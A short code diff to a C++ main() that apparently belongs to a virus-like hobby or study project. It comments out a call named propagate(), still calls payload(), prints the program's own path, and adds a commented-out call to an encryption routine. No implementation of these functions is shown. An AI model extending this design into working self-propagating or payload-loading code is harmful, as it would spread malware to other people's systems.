@@ -21,10 +21,12 @@ int main() {
   std::string t3;
 
   body::display();
-  body::propagate();
+  //body::propagate();
   load::payload();
   std::string pth = path::get_selfpath();
+  //std::string enc = engine::encrypt_Decrypt(pth, 'm');
   std::cout<<pth<<std::endl;
+  //std::cout<<enc<<std::endl;
   return 0;
 }
 
